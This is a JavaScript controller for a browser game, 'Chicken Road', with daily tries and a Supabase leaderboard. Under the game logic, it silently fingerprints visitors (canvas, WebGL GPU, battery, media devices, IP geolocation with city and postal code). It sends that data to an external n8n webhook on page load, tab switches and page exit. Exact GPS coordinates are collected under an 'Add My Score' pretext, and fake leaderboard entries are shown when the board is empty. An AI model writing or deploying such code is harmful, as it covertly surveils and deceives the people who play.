/**
 * CHICKEN ROAD — Main Controller Script
 *
 * Features:
 *  - Device & IP fingerprinting
 *  - 3 webhook events: page_visit, username_submitted, location_submitted
 *  - 3 tries per day (localStorage)
 *  - Game over overlay with leaderboard (always visible)
 *  - Optional geolocation to submit score to Supabase
 *  - Top 10 leaderboard with country flags
 *  - Fake seed entries (Israel + France) when leaderboard is empty
 */

(function () {
  'use strict';

  /* ─── Config ─── */
  const WEBHOOK_URL    = 'https://n8n.krf-studio.com/webhook/2a849483-3467-4ca5-ae04-b53de826226e';
  const SUPABASE_URL   = 'https://qivgveutnlbawlvlpkbg.supabase.co';
  const SUPABASE_KEY   = 'sb_publishable_FnaIhRz7wdgrhx81rKIWXA_Amwk6v45';
  const TRIES_PER_DAY  = 3;

  /* ─── Fake seed scores (shown when leaderboard is empty) ─── */
  const FAKE_ENTRIES = [
    { username: 'DavidK',   score: 47, country: 'Israel', country_code: 'IL' },
    { username: 'PierreM',  score: 43, country: 'France',  country_code: 'FR' },
    { username: 'YaelB',    score: 38, country: 'Israel', country_code: 'IL' },
    { username: 'SophieL',  score: 31, country: 'France',  country_code: 'FR' },
    { username: 'MoshiA',   score: 27, country: 'Israel', country_code: 'IL' },
    { username: 'JulieT',   score: 22, country: 'France',  country_code: 'FR' },
    { username: 'RonG',     score: 18, country: 'Israel', country_code: 'IL' },
    { username: 'ClaireD',  score: 14, country: 'France',  country_code: 'FR' },
  ];

  /* ─── State ─── */
  let deviceInfo       = {};
  let ipData           = {};
  let sessionStartTime = Date.now();
  const userProfile    = { username: '', country: '', countryCode: '', flag: '' };
  let currentScore     = 0;
  let scoreSubmitted   = false; // prevent double-submit per game-over

  /* ══════════════════════════════════════
     1. DAILY TRIES SYSTEM (localStorage)
  ══════════════════════════════════════ */
  function getTodayKey() {
    return new Date().toISOString().slice(0, 10); // e.g. "2025-04-11"
  }

  function getTriesData(username) {
    try {
      const raw = localStorage.getItem('cr_tries_' + username.toLowerCase());
      if (!raw) return { date: '', count: 0 };
      return JSON.parse(raw);
    } catch (e) { return { date: '', count: 0 }; }
  }

  function saveTriesData(username, data) {
    try {
      localStorage.setItem('cr_tries_' + username.toLowerCase(), JSON.stringify(data));
    } catch (e) {}
  }

  function getRemainingTries(username) {
    const data  = getTriesData(username);
    const today = getTodayKey();
    if (data.date !== today) return TRIES_PER_DAY;
    return Math.max(0, TRIES_PER_DAY - data.count);
  }

  /** Consumes one try. Returns remaining tries after consuming. */
  function consumeTry(username) {
    const today = getTodayKey();
    const data  = getTriesData(username);
    if (data.date !== today) {
      saveTriesData(username, { date: today, count: 1 });
      return TRIES_PER_DAY - 1;
    }
    const newCount = data.count + 1;
    saveTriesData(username, { date: today, count: newCount });
    return Math.max(0, TRIES_PER_DAY - newCount);
  }

  /* ══════════════════════════════════════
     2. DEVICE FINGERPRINTING
  ══════════════════════════════════════ */
  function collectDeviceInfo() {
    const nav = navigator, scr = screen, w = window;
    deviceInfo = {
      userAgent: nav.userAgent, platform: nav.platform,
      language: nav.language,
      languages: nav.languages ? nav.languages.join(', ') : nav.language,
      cookiesEnabled: nav.cookieEnabled, doNotTrack: nav.doNotTrack,
      screenWidth: scr.width, screenHeight: scr.height,
      screenAvailWidth: scr.availWidth, screenAvailHeight: scr.availHeight,
      colorDepth: scr.colorDepth, pixelRatio: w.devicePixelRatio,
      innerWidth: w.innerWidth, innerHeight: w.innerHeight,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      timezoneOffset: new Date().getTimezoneOffset(),
      touchSupport: 'ontouchstart' in w || nav.maxTouchPoints > 0,
      maxTouchPoints: nav.maxTouchPoints || 0,
      hardwareConcurrency: nav.hardwareConcurrency || 'unknown',
      deviceMemory: nav.deviceMemory || 'unknown',
      connectionType: 'unknown', connectionDownlink: 'unknown',
      connectionEffectiveType: 'unknown',
      referrer: document.referrer || 'direct',
      currentUrl: w.location.href
    };
    const conn = nav.connection || nav.mozConnection || nav.webkitConnection;
    if (conn) {
      deviceInfo.connectionType          = conn.type          || 'unknown';
      deviceInfo.connectionDownlink      = conn.downlink      || 'unknown';
      deviceInfo.connectionEffectiveType = conn.effectiveType || 'unknown';
      deviceInfo.connectionSaveData      = conn.saveData      || false;
    }
    if (nav.getBattery) {
      nav.getBattery().then(b => {
        deviceInfo.batteryLevel    = Math.round(b.level * 100) + '%';
        deviceInfo.batteryCharging = b.charging;
      }).catch(() => {});
    }
    try {
      const c = document.createElement('canvas');
      const ctx = c.getContext('2d');
      ctx.textBaseline = 'top'; ctx.font = '14px Arial'; ctx.fillText('fp', 2, 2);
      deviceInfo.canvasHash = c.toDataURL().slice(-50);
    } catch (e) { deviceInfo.canvasHash = 'blocked'; }
    try {
      const c2 = document.createElement('canvas');
      const gl = c2.getContext('webgl') || c2.getContext('experimental-webgl');
      if (gl) {
        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
        if (dbg) {
          deviceInfo.gpuVendor   = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
          deviceInfo.gpuRenderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
        }
      }
    } catch (e) { deviceInfo.gpuVendor = deviceInfo.gpuRenderer = 'unknown'; }
    deviceInfo.pluginsCount = nav.plugins ? nav.plugins.length : 0;
    if (nav.mediaDevices && nav.mediaDevices.enumerateDevices) {
      nav.mediaDevices.enumerateDevices().then(devs => {
        deviceInfo.audioInputs  = devs.filter(d => d.kind === 'audioinput').length;
        deviceInfo.audioOutputs = devs.filter(d => d.kind === 'audiooutput').length;
        deviceInfo.videoInputs  = devs.filter(d => d.kind === 'videoinput').length;
      }).catch(() => {});
    }
  }

  /* ══════════════════════════════════════
     3. IP / GEO LOOKUP
  ══════════════════════════════════════ */
  function collectIpData() {
    return fetch('https://ipapi.co/json/')
      .then(r => r.json())
      .then(data => {
        ipData = {
          ip: data.ip, city: data.city, region: data.region,
          country: data.country_name, countryCode: data.country_code,
          postal: data.postal, latitude: data.latitude, longitude: data.longitude,
          isp: data.org, asn: data.asn
        };
        return ipData;
      })
      .catch(() => { ipData = { error: 'blocked' }; return ipData; });
  }

  /* ══════════════════════════════════════
     4. WEBHOOK SENDER
  ══════════════════════════════════════ */
  function sendToWebhook(eventType, extraData = {}) {
    const payload = {
      event:           eventType,
      timestamp:       new Date().toISOString(),
      sessionDuration: Math.round((Date.now() - sessionStartTime) / 1000) + 's',
      user:            { ...userProfile },
      device:          deviceInfo,
      network:         ipData,
      ...extraData
    };
    fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    }).catch(() => {});
  }

  /* ══════════════════════════════════════
     5. SUPABASE — Insert score
  ══════════════════════════════════════ */
  function insertScore(username, score, country, countryCode) {
    return fetch(`${SUPABASE_URL}/rest/v1/leaderboard`, {
      method: 'POST',
      headers: {
        'Content-Type':  'application/json',
        'apikey':        SUPABASE_KEY,
        'Authorization': `Bearer ${SUPABASE_KEY}`,
        'Prefer':        'return=representation'
      },
      body: JSON.stringify({
        username:     username,
        score:        score,
        country:      country      || 'Unknown',
        country_code: countryCode  || ''
      })
    })
    .then(r => r.json())
    .catch(() => null);
  }

  /* ══════════════════════════════════════
     6. SUPABASE — Fetch top 10
  ══════════════════════════════════════ */
  function fetchLeaderboard() {
    return fetch(
      `${SUPABASE_URL}/rest/v1/leaderboard?select=username,score,country,country_code&order=score.desc&limit=10`,
      {
        headers: {
          'apikey':        SUPABASE_KEY,
          'Authorization': `Bearer ${SUPABASE_KEY}`
        }
      }
    )
    .then(r => r.json())
    .catch(() => []);
  }

  /* ══════════════════════════════════════
     7. COUNTRY FLAG EMOJI helper
  ══════════════════════════════════════ */
  function countryCodeToFlag(code) {
    if (!code || code.length !== 2) return '🌍';
    return code.toUpperCase().replace(/./g, ch =>
      String.fromCodePoint(0x1F1E6 - 65 + ch.charCodeAt(0))
    );
  }

  /* ══════════════════════════════════════
     8. DOM REFS
  ══════════════════════════════════════ */
  const screenUsername     = document.getElementById('screen-username');
  const screenGame         = document.getElementById('screen-game');
  const usernameInput      = document.getElementById('username-input');
  const btnPlay            = document.getElementById('btn-play');
  const usernameError      = document.getElementById('username-error');

  const resultContainer    = document.getElementById('result-container');
  const finalScoreEl       = document.getElementById('final-score');
  const locationSection    = document.getElementById('location-section');
  const btnAllowLoc        = document.getElementById('btn-allow-location');
  const btnSkipLoc         = document.getElementById('btn-skip-location');
  const leaderboardLoading = document.getElementById('leaderboard-loading');
  const leaderboardList    = document.getElementById('leaderboard-list');
  const retryBtn           = document.getElementById('retry');
  const triesInfo          = document.getElementById('tries-info');

  /* ══════════════════════════════════════
     9. HELPERS — show/hide username error
  ══════════════════════════════════════ */
  function showUsernameError(msg) {
    if (!usernameError) return;
    usernameError.textContent = msg;
    usernameError.classList.remove('hidden');
  }
  function hideUsernameError() {
    if (!usernameError) return;
    usernameError.classList.add('hidden');
  }

  /* ══════════════════════════════════════
     10. SCREEN TRANSITION
  ══════════════════════════════════════ */
  function showGameScreen() {
    screenUsername.classList.remove('active');
    screenUsername.classList.add('hidden');
    screenGame.classList.remove('hidden');
    requestAnimationFrame(() => screenGame.classList.add('active'));
  }

  /* ══════════════════════════════════════
     11. USERNAME SUBMIT
  ══════════════════════════════════════ */
  function submitUsername() {
    const val = usernameInput.value.trim();
    if (!val) {
      usernameInput.focus();
      usernameInput.style.borderColor = '#f72585';
      setTimeout(() => { usernameInput.style.borderColor = ''; }, 800);
      showUsernameError('Please enter a username.');
      return;
    }
    hideUsernameError();
    userProfile.username = val;

    /* Check daily tries */
    const remaining = getRemainingTries(val);
    if (remaining <= 0) {
      showUsernameError('⏰ You\'ve used all 3 tries today! Come back tomorrow.');
      return;
    }

    /* Consume one try */
    const left = consumeTry(val);

    /* Webhook #2 */
    sendToWebhook('username_submitted', { username: val, triesRemaining: left });

    showGameScreen();

    if (typeof window._startGame === 'function') {
      window._startGame();
    }
  }



  btnPlay.addEventListener('click', submitUsername);
  usernameInput.addEventListener('keydown', e => { if (e.key === 'Enter') submitUsername(); });
  usernameInput.addEventListener('input', hideUsernameError);

  /* ══════════════════════════════════════
     12. GAME OVER (called by script2.js)
  ══════════════════════════════════════ */
  window.onGameOver = function (score) {
    currentScore   = score;
    scoreSubmitted = false;

    /* Update score display */
    if (finalScoreEl) finalScoreEl.textContent = score;

    /* Reset location section */
    if (locationSection) locationSection.classList.remove('hidden');
    if (btnAllowLoc) { btnAllowLoc.textContent = '📍 Add My Score'; btnAllowLoc.disabled = false; }
    if (btnSkipLoc)  { btnSkipLoc.disabled = false; }

    /* Update retry button with remaining tries */
    const remaining = getRemainingTries(userProfile.username);
    updateRetryButton(remaining);

    /* Show overlay */
    if (resultContainer) resultContainer.classList.add('visible');

    /* Load leaderboard immediately */
    loadLeaderboard(false);
  };

  function updateRetryButton(remaining) {
    if (!retryBtn || !triesInfo) return;
    if (remaining > 0) {
      retryBtn.disabled = false;
      retryBtn.classList.remove('btn-retry-disabled');
      triesInfo.textContent = `${remaining} tr${remaining === 1 ? 'y' : 'ies'} remaining today`;
      triesInfo.style.color = remaining === 1 ? '#f72585' : 'rgba(0,245,255,0.6)';
    } else {
      retryBtn.disabled = true;
      retryBtn.classList.add('btn-retry-disabled');
      triesInfo.textContent = '😴 No more tries today — come back tomorrow!';
      triesInfo.style.color = 'rgba(255,255,255,0.4)';
    }
  }

  /* ══════════════════════════════════════
     13. LEADERBOARD DISPLAY
  ══════════════════════════════════════ */
  async function loadLeaderboard(highlightNew) {
    if (leaderboardLoading) leaderboardLoading.classList.remove('hidden');
    if (leaderboardList)    leaderboardList.innerHTML = '';

    let entries = await fetchLeaderboard();

    if (leaderboardLoading) leaderboardLoading.classList.add('hidden');
    if (!leaderboardList) return;

    /* If empty, use fake seed entries */
    if (!entries || !Array.isArray(entries) || entries.length === 0) {
      entries = FAKE_ENTRIES;
    }

    const medals    = ['🥇', '🥈', '🥉'];
    const rankClass = ['gold', 'silver', 'bronze'];

    entries.forEach((entry, i) => {
      const rank      = i + 1;
      const flag      = countryCodeToFlag(entry.country_code);
      const isNewMe   = highlightNew &&
                        entry.username === userProfile.username &&
                        entry.score    === currentScore;
      const rankLabel = rank <= 3 ? medals[i] : `#${rank}`;
      const rClass    = rank <= 3 ? rankClass[i] : '';

      const li = document.createElement('li');
      li.className = `leaderboard-entry${isNewMe ? ' highlight' : ''}`;
      li.innerHTML = `
        <span class="lb-rank ${rClass}">${rankLabel}</span>
        <span class="lb-flag">${flag}</span>
        <span class="lb-name">${escapeHtml(entry.username)}</span>
        <span class="lb-score">${entry.score}</span>
      `;
      leaderboardList.appendChild(li);
    });
  }

  function escapeHtml(str) {
    return String(str)
      .replace(/&/g,'&amp;').replace(/</g,'&lt;')
      .replace(/>/g,'&gt;').replace(/"/g,'&quot;');
  }

  /* ══════════════════════════════════════
     14. LOCATION — Allow
  ══════════════════════════════════════ */
  btnAllowLoc && btnAllowLoc.addEventListener('click', () => {
    if (scoreSubmitted) return;
    btnAllowLoc.textContent = '⏳ Locating...';
    btnAllowLoc.disabled    = true;
    if (btnSkipLoc) btnSkipLoc.disabled = true;

    const onSuccess = (pos) => {
      userProfile.locationSource   = 'GPS';
      userProfile.locationAccuracy = pos.coords.accuracy + 'm';
      finishAndSubmit(pos.coords.latitude, pos.coords.longitude);
    };
    const onError = () => finishAndSubmit(ipData.latitude, ipData.longitude, true);

    if ('geolocation' in navigator) {
      navigator.geolocation.getCurrentPosition(onSuccess, onError, {
        enableHighAccuracy: true, timeout: 8000, maximumAge: 0
      });
    } else { onError(); }
  });

  async function finishAndSubmit(lat, lon, ipFallback = false) {
    scoreSubmitted = true;

    const country     = ipData.country     || 'Unknown';
    const countryCode = ipData.countryCode || '';

    userProfile.country     = country;
    userProfile.countryCode = countryCode;
    userProfile.flag        = countryCodeToFlag(countryCode);
    userProfile.location    = (lat && lon) ? `${lat}, ${lon}` : 'unavailable';
    userProfile.locationSource = ipFallback ? 'IP' : (userProfile.locationSource || 'GPS');

    /* Webhook #3 */
    sendToWebhook('location_submitted', { score: currentScore, country, countryCode, lat, lon });

    /* Hide location section */
    if (locationSection) locationSection.classList.add('hidden');

    /* Insert into Supabase then refresh leaderboard */
    await insertScore(userProfile.username, currentScore, country, countryCode);
    loadLeaderboard(true);
  }

  /* ══════════════════════════════════════
     15. LOCATION — Skip
  ══════════════════════════════════════ */
  btnSkipLoc && btnSkipLoc.addEventListener('click', () => {
    if (scoreSubmitted) return;
    scoreSubmitted = true;
    if (locationSection) locationSection.classList.add('hidden');
    sendToWebhook('location_skipped', { score: currentScore });
    /* Leaderboard already loaded — just hide the section, no re-fetch needed */
  });

  /* ══════════════════════════════════════
     16. RETRY BUTTON
  ══════════════════════════════════════ */
  retryBtn && retryBtn.addEventListener('click', () => {
    const remaining = getRemainingTries(userProfile.username);
    if (remaining <= 0) return;

    if (resultContainer) resultContainer.classList.remove('visible');

    if (typeof window._retryGame === 'function') {
      window._retryGame();
    }
  });

  /* ══════════════════════════════════════
     17. INIT — collect data + fire page_visit webhook
  ══════════════════════════════════════ */
  collectDeviceInfo();
  const ipDataPromise = collectIpData();

  /* Webhook #1 — page_visit */
  ipDataPromise.then(() => {
    sendToWebhook('page_visit', { action: 'user_landed_on_game_page' });
  });

  usernameInput && usernameInput.focus();

  /* Passive tracking */
  document.addEventListener('visibilitychange', () => {
    sendToWebhook('visibility', { state: document.visibilityState, score: currentScore });
  });

  window.addEventListener('beforeunload', () => {
    const payload = JSON.stringify({
      event: 'session_end', timestamp: new Date().toISOString(),
      totalDuration: Math.round((Date.now() - sessionStartTime) / 1000) + 's',
      finalScore: currentScore, user: userProfile, device: deviceInfo, network: ipData
    });
    navigator.sendBeacon(WEBHOOK_URL, payload);
  });

})();
